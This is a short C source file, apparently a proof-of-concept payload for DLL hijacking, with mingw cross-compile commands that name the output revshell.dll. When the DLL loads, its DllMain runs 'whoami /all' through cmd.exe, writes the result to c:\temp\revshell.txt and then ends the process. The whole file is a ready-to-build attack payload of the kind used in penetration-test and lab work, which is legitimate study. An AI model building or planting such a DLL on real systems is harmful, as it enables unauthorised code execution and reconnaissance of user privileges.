// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o revshell.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o revshell.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami /all > c:\\temp\\revshell.txt");
        ExitProcess(0);
    }
    return TRUE;
}
